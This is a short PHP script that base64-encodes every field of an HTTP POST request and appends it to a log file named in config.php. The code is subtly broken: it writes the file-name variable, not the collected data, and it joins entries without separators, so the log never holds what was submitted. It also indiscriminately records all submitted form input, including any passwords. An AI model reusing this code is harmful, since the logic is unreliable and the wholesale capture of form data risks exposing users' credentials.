<?php
require_once('config.php');

$logstr = "";
foreach ($_POST as $key => $value) {
  $value = base64_encode($value);
  $logstr .= "$key=$value";
}

if (!$handle = fopen($logfile, 'a')) {
  echo "Cannot open file ($logfile)";
  exit;
}

fwrite($handle, $logfile);
?>
